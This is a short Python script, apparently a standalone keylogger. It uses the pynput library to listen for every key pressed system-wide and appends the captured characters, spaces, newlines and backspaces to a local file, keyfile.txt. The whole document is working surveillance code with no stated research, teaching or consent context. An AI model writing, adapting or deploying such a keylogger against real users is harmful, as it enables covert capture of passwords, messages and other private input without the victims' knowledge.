from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        if str(key) == "Key.space":
            logkey.write(" ")
        elif str(key) == "Key.enter":
            logkey.write("\n")
        elif str(key) == "Key.backspace":
            logkey.write("\b")
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()